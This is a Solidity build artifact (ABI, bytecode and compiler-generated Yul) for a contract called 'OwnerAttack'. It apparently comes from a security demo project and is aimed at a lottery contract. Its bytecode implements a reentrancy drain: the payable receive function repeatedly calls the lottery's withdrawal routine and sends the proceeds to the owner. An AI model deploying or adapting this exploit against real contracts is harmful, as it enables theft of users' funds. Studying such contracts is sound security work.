{
  "contractName": "OwnerAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_lotteryContractAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "lotteryContract",
      "outputs": [
        {
          "internalType": "contract ILottery",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "bet",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_lotteryContractAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bet\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lotteryContract\",\"outputs\":[{\"internalType\":\"contract ILottery\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"project:/contracts/OwnerAttack.sol\":\"OwnerAttack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"project:/contracts/OwnerAttack.sol\":{\"keccak256\":\"0x53c6d02aba46605d9ed734441c077b0ef8baa2a1e79b97c9770d721683a327fa\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b2d8101a1730957c424b680daf1747a25d97e95add22ca809e6cce6479bfb8ff\",\"dweb:/ipfs/QmNisE9hav8QhPMn6vZHKWoq67P5w5NvAXB423M4hPXW14\"]}},\"version\":1}",
  "bytecode": "0x60a060405234801561001057600080fd5b506040516106d73803806106d78339818101604052810190610032919061010f565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b60805161056661017160003960008181604001528181607d0152818161023e0152818161034f01526103d101526105666000f3fe6080604052600436106100385760003560e01c806311610c251461016f5780639e5faafc14610179578063b29c662a146101835761016a565b3661016a57347f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163110610100577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663900e92c46040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e357600080fd5b505af11580156100f7573d6000803e3d6000fd5b50505050610168565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610166573d6000803e3d6000fd5b505b005b600080fd5b6101776101ae565b005b6101816102bf565b005b34801561018f57600080fd5b506101986103cf565b6040516101a59190610472565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461023c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161023390610510565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166311610c25346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102a457600080fd5b505af11580156102b8573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461034d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161034490610510565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663900e92c46040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103b557600080fd5b505af11580156103c9573d6000803e3d6000fd5b50505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061043861043361042e846103f3565b610413565b6103f3565b9050919050565b600061044a8261041d565b9050919050565b600061045c8261043f565b9050919050565b61046c81610451565b82525050565b60006020820190506104876000830184610463565b92915050565b600082825260208201905092915050565b7f41747461636b204f6e6c79206f776e65722063616e20706572666f726d20746860008201527f697320616374696f6e0000000000000000000000000000000000000000000000602082015250565b60006104fa60298361048d565b91506105058261049e565b604082019050919050565b60006020820190508181036000830152610529816104ed565b905091905056fea26469706673582212201f96365d410d9f151fdcfe2b7960870525dafb23912c8ee88da1342698653e4364736f6c63430008110033",
  "deployedBytecode": "0x6080604052600436106100385760003560e01c806311610c251461016f5780639e5faafc14610179578063b29c662a146101835761016a565b3661016a57347f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163110610100577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663900e92c46040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e357600080fd5b505af11580156100f7573d6000803e3d6000fd5b50505050610168565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610166573d6000803e3d6000fd5b505b005b600080fd5b6101776101ae565b005b6101816102bf565b005b34801561018f57600080fd5b506101986103cf565b6040516101a59190610472565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461023c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161023390610510565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166311610c25346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102a457600080fd5b505af11580156102b8573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461034d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161034490610510565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663900e92c46040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103b557600080fd5b505af11580156103c9573d6000803e3d6000fd5b50505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061043861043361042e846103f3565b610413565b6103f3565b9050919050565b600061044a8261041d565b9050919050565b600061045c8261043f565b9050919050565b61046c81610451565b82525050565b60006020820190506104876000830184610463565b92915050565b600082825260208201905092915050565b7f41747461636b204f6e6c79206f776e65722063616e20706572666f726d20746860008201527f697320616374696f6e0000000000000000000000000000000000000000000000602082015250565b60006104fa60298361048d565b91506105058261049e565b604082019050919050565b60006020820190508181036000830152610529816104ed565b905091905056fea26469706673582212201f96365d410d9f151fdcfe2b7960870525dafb23912c8ee88da1342698653e4364736f6c63430008110033",
  "immutableReferences": {
    "10282": [
      {
        "length": 32,
        "start": 64
      },
      {
        "length": 32,
        "start": 125
      },
      {
        "length": 32,
        "start": 574
      },
      {
        "length": 32,
        "start": 847
      },
      {
        "length": 32,
        "start": 977
      }
    ]
  },
  "generatedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:1199:7",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "47:35:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "57:19:7",
                  "value": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "73:2:7",
                        "type": "",
                        "value": "64"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "67:5:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "67:9:7"
                  },
                  "variableNames": [
                    {
                      "name": "memPtr",
                      "nodeType": "YulIdentifier",
                      "src": "57:6:7"
                    }
                  ]
                }
              ]
            },
            "name": "allocate_unbounded",
            "nodeType": "YulFunctionDefinition",
            "returnVariables": [
              {
                "name": "memPtr",
                "nodeType": "YulTypedName",
                "src": "40:6:7",
                "type": ""
              }
            ],
            "src": "7:75:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "177:28:7",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "194:1:7",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "197:1:7",
                        "type": "",
                        "value": "0"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "187:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "187:12:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "187:12:7"
                }
              ]
            },
            "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
            "nodeType": "YulFunctionDefinition",
            "src": "88:117:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "300:28:7",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "317:1:7",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "320:1:7",
                        "type": "",
                        "value": "0"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "310:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "310:12:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "310:12:7"
                }
              ]
            },
            "name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
            "nodeType": "YulFunctionDefinition",
            "src": "211:117:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "379:81:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "389:65:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "404:5:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "411:42:7",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "400:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "400:54:7"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "389:7:7"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "361:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "371:7:7",
                "type": ""
              }
            ],
            "src": "334:126:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "511:51:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "521:35:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "550:5:7"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "532:17:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "532:24:7"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "521:7:7"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "493:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "503:7:7",
                "type": ""
              }
            ],
            "src": "466:96:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "611:79:7",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "668:16:7",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "677:1:7",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "680:1:7",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "670:6:7"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "670:12:7"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "670:12:7"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "634:5:7"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "659:5:7"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_address",
                              "nodeType": "YulIdentifier",
                              "src": "641:17:7"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "641:24:7"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "631:2:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "631:35:7"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "624:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "624:43:7"
                  },
                  "nodeType": "YulIf",
                  "src": "621:63:7"
                }
              ]
            },
            "name": "validator_revert_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "604:5:7",
                "type": ""
              }
            ],
            "src": "568:122:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "759:80:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "769:22:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "784:6:7"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "778:5:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "778:13:7"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "769:5:7"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "827:5:7"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_address",
                      "nodeType": "YulIdentifier",
                      "src": "800:26:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "800:33:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "800:33:7"
                }
              ]
            },
            "name": "abi_decode_t_address_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "737:6:7",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "745:3:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "753:5:7",
                "type": ""
              }
            ],
            "src": "696:143:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "922:274:7",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "968:83:7",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                            "nodeType": "YulIdentifier",
                            "src": "970:77:7"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "970:79:7"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "970:79:7"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "943:7:7"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "952:9:7"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "939:3:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "939:23:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "964:2:7",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "935:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "935:32:7"
                  },
                  "nodeType": "YulIf",
                  "src": "932:119:7"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "1061:128:7",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "1076:15:7",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1090:1:7",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "1080:6:7",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "1105:74:7",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "1151:9:7"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "1162:6:7"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "1147:3:7"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "1147:22:7"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "1171:7:7"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_address_fromMemory",
                          "nodeType": "YulIdentifier",
                          "src": "1115:31:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1115:64:7"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "1105:6:7"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_address_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "892:9:7",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "903:7:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "915:6:7",
                "type": ""
              }
            ],
            "src": "845:351:7"
          }
        ]
      },
      "contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
      "id": 7,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "deployedGeneratedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:2275:7",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "52:81:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "62:65:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "77:5:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "84:42:7",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "73:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "73:54:7"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "62:7:7"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "34:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "44:7:7",
                "type": ""
              }
            ],
            "src": "7:126:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "171:28:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "181:12:7",
                  "value": {
                    "name": "value",
                    "nodeType": "YulIdentifier",
                    "src": "188:5:7"
                  },
                  "variableNames": [
                    {
                      "name": "ret",
                      "nodeType": "YulIdentifier",
                      "src": "181:3:7"
                    }
                  ]
                }
              ]
            },
            "name": "identity",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "157:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "ret",
                "nodeType": "YulTypedName",
                "src": "167:3:7",
                "type": ""
              }
            ],
            "src": "139:60:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "265:82:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "275:66:7",
                  "value": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "333:5:7"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_uint160",
                              "nodeType": "YulIdentifier",
                              "src": "315:17:7"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "315:24:7"
                          }
                        ],
                        "functionName": {
                          "name": "identity",
                          "nodeType": "YulIdentifier",
                          "src": "306:8:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "306:34:7"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "288:17:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "288:53:7"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "275:9:7"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_uint160_to_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "245:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "255:9:7",
                "type": ""
              }
            ],
            "src": "205:142:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "413:66:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "423:50:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "467:5:7"
                      }
                    ],
                    "functionName": {
                      "name": "convert_t_uint160_to_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "436:30:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "436:37:7"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "423:9:7"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_uint160_to_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "393:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "403:9:7",
                "type": ""
              }
            ],
            "src": "353:126:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "563:66:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "573:50:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "617:5:7"
                      }
                    ],
                    "functionName": {
                      "name": "convert_t_uint160_to_t_address",
                      "nodeType": "YulIdentifier",
                      "src": "586:30:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "586:37:7"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "573:9:7"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_contract$_ILottery_$10265_to_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "543:5:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "553:9:7",
                "type": ""
              }
            ],
            "src": "485:144:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "718:84:7",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "735:3:7"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "789:5:7"
                          }
                        ],
                        "functionName": {
                          "name": "convert_t_contract$_ILottery_$10265_to_t_address",
                          "nodeType": "YulIdentifier",
                          "src": "740:48:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "740:55:7"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "728:6:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "728:68:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "728:68:7"
                }
              ]
            },
            "name": "abi_encode_t_contract$_ILottery_$10265_to_t_address_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "706:5:7",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "713:3:7",
                "type": ""
              }
            ],
            "src": "635:167:7"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "924:142:7",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "934:26:7",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "946:9:7"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "957:2:7",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "942:3:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "942:18:7"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "934:4:7"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "1032:6:7"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "1045:9:7"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1056:1:7",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1041:3:7"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1041:17:7"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_contract$_ILottery_$10265_to_t_address_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "970:61:7"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "970:89:7"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "970:89:7"
                }
              ]
            },
            "name": "abi_encode_tuple_t_contract$_ILottery_$10265__to_t_address__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "896:9:7",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "908:6:7",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "919:4:7",
                "type": ""
              }
            ],
            "src": "808:258:7"
          },
